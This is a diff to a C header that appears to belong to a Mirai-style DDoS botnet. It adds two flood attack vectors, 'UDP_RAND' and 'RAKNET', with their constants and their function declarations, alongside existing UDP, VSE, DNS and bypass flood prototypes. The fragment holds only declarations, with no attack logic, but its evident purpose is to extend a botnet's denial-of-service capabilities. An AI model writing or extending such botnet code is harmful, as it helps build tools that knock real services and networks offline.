@@ -40,6 +40,8 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_STD        12 
 #define ATK_VEC_LEGIT      13 
 #define ATK_VEC_SOCKET     14 
+#define ATK_VEC_UDP_RAND   15 
+#define ATK_VEC_RAKNET     16 
 
 #define ATK_OPT_PAYLOAD_SIZE    0   
 #define ATK_OPT_PAYLOAD_RAND    1   
@@ -83,12 +85,13 @@ char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
 int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
 uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
 
-
 void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_udp_rand(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_udp_raknet(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 void attack_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
